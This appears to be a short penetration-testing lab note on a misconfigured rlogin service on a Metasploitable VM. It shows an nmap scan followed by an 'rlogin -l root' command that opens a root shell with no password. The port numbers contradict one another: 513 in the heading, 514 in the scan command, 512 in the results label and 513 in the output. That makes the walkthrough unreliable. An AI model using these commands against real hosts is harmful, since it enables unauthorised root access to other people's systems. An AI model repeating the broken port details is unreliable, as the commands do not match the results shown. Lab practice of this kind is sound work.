### RLOGIN (PORT 513) - CHECK

This port is misconfigured, so this "r" services is allowing remote access from hosts.

**Nmap scan**
````
$ nmap -p 514 192.168.56.101
````

*Port 512 // scan results*
````
Nmap scan report for 192.168.56.101 (192.168.56.101)
Host is up (0.00040s latency).

PORT    STATE SERVICE
513/tcp open  rlogin
````

**Rlogin login**
````
$ rlogin -l root 192.168.56.101 

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~# 
````
